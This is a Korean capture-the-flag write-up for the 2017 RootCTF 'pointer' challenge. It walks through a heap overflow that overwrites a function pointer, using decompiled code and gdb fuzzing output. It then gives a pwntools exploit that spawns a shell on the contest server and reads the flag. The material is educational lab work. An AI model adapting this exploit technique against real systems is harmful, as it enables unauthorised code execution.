# [2017_ROOTCTF] \[PWN] pointer

## Key words

* Heap based Buffer Overflow

## Solution

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 result; // rax@4
  __int64 v4; // rcx@4
  char v5; // [sp+Fh] [bp-11h]@1
  void *buf; // [sp+10h] [bp-10h]@1
  __int64 v7; // [sp+18h] [bp-8h]@1

  v7 = *MK_FP(__FS__, 40LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  buf = malloc(0x30uLL);
  *((_QWORD *)buf + 2) = sub_400796;
  (*((void (__fastcall **)(_QWORD, _QWORD))buf + 2))(48LL, 0LL);
  read(0, buf, 0x64uLL);
  puts("Retry?(Y/N)");
  __isoc99_scanf("%c", &v5);
  if ( v5 == 89 )
    (*((void (**)(void))buf + 2))();
  else
    puts("Good bye");
  result = 0LL;
  v4 = *MK_FP(__FS__, 40LL) ^ v7;
  return result;
}
```

malloc을 0x30만큼 한 후, read할 때 0x64만큼 합니다. 오버플로우가 발생할 것으로 예상됩니다.

랜덤 패턴으로 퍼징을 해보았습니다.

```
gdb-peda$ pattern_create 0x63
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AA'
gdb-peda$ r
Starting program: /root/labs/ctf/2017_rootctf/pointer 
welcome to RootCTF!
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AA
Retry?(Y/N)
Y

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7b04230 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x41412d4141434141 ('AACAA-AA')
RSI: 0x1 
RDI: 0x7fffffffddc0 --> 0x0 
RBP: 0x7fffffffe300 --> 0x4008c0 (push   r15)
RSP: 0x7fffffffe2e0 --> 0x4008c0 (push   r15)
RIP: 0x40088e (call   rdx)
R8 : 0x0 
R9 : 0x7ffff7fe3700 (0x00007ffff7fe3700)
R10: 0x400972 --> 0x20646f6f47006325 ('%c')
R11: 0x246 
R12: 0x4006a0 (xor    ebp,ebp)
R13: 0x7fffffffe3e0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400881:	mov    rax,QWORD PTR [rbp-0x10]
   0x400885:	mov    rdx,QWORD PTR [rax+0x10]
   0x400889:	mov    eax,0x0
=> 0x40088e:	call   rdx
   0x400890:	jmp    0x40089c
   0x400892:	mov    edi,0x400975
   0x400897:	call   0x400610 <puts@plt>
   0x40089c:	mov    eax,0x0
No argument
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe2e0 --> 0x4008c0 (push   r15)
0008| 0x7fffffffe2e8 --> 0x59000000004006a0 
0016| 0x7fffffffe2f0 --> 0x602010 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AA\n")
0024| 0x7fffffffe2f8 --> 0x6557323f29e96f00 
0032| 0x7fffffffe300 --> 0x4008c0 (push   r15)
0040| 0x7fffffffe308 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe310 --> 0x0 
0056| 0x7fffffffe318 --> 0x7fffffffe3e8 --> 0x7fffffffe633 ("/root/labs/ctf/2017_rootctf/pointer")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000000000040088e in ?? ()
gdb-peda$ 
gdb-peda$ pattern_search
Registers contain pattern buffer:
RDX+0 found at offset: 16
No register points to pattern buffer
Pattern buffer found at:
0x00602010 : offset    0 - size   99 ([heap])
References to pattern buffer found at:
0x00007fffffffe2f0 : 0x00602010 ($sp + 0x10 [4 dwords])
```

16만큼의 오프셋 후에 조작할 주소를 적어주면 되는데 다음과 같이 매직 함수가 존재합니다.

```
.text:00000000004007A7                 push    rbp
.text:00000000004007A8                 mov     rbp, rsp
.text:00000000004007AB                 mov     edi, offset aGood ; "Good~"
.text:00000000004007B0                 call    _puts
.text:00000000004007B5                 mov     edi, offset aBinSh ; "/bin/sh"
.text:00000000004007BA                 call    _system
.text:00000000004007BF                 nop
.text:00000000004007C0                 pop     rbp
.text:00000000004007C1                 retn
```

rip를 0x4007a7로 바꾸면 됩니다.

## Exploit

```python
from pwn import  *
import sys

if len(sys.argv) == 1:
	p = process("./pointer")
else:
	p = remote("222.110.147.52",42632)


print p.recv()
payload = "a"*16
payload += p64(0x4007a7)
p.sendline(payload)
print p.recv()
p.sendline("Y")
p.interactive()
```

## 실행 결과

```
[+] Opening connection to 222.110.147.52 on port 42632: Done
welcome to RootCTF!


[*] Switching to interactive mode
Retry?(Y/N)
Good~
$ ls
flag
pointer
run.sh
$ cat flag
FLAG is FLAG{P0InT_2_pOiNt_2_PO1t3R!}
```

